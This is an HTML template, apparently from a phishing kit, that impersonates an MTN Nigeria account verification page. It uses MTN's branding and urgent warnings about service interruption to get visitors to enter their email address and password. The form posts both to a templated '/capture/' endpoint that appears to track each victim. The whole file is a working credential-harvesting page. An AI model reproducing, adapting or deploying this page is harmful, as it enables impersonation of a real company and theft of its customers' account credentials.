<!DOCTYPE html>
<html>
<head>
    <title>MTN - Account Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        .header {
            background: #ffcc00;
            padding: 18px 30px;
            display: flex;
            align-items: center;
        }
        .header h1 { color: #000; font-size: 28px; font-weight: 900; }
        .hero {
            background: #333;
            padding: 20px 30px;
            color: white;
            text-align: center;
            font-size: 14px;
        }
        .form-section {
            background: white;
            padding: 30px 25px;
            max-width: 420px;
            margin: 0 auto;
        }
        h2 { text-align: center; color: #333; margin-bottom: 8px; font-size: 18px; }
        .subtitle { text-align: center; color: #999; font-size: 13px; margin-bottom: 25px; }
        label { display: block; font-size: 14px; font-weight: bold; color: #333; margin-bottom: 6px; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 14px; border: 1px solid #ddd;
            border-radius: 4px; font-size: 15px; margin-bottom: 18px; background: #f9f9f9;
        }
        .btn { width: 100%; padding: 15px; background: #ffcc00; color: #000; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="header">
        <h1>MTN</h1>
    </div>
    <div class="hero">
        <p>Important: Your account requires immediate verification</p>
    </div>
    <div class="form-section">
        <h2>Account Verification</h2>
        <div class="subtitle">Verify your identity to avoid service interruption</div>
        <form action="/capture/{{ code }}" method="POST">
            <label>Email Address</label>
            <input type="email" name="email" placeholder="Enter your email" required>
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button class="btn" type="submit">Verify Account</button>
        </form>
        <div class="footer">MTN Nigeria Communications Plc — mtn.com.ng</div>
    </div>
</body>
</html>
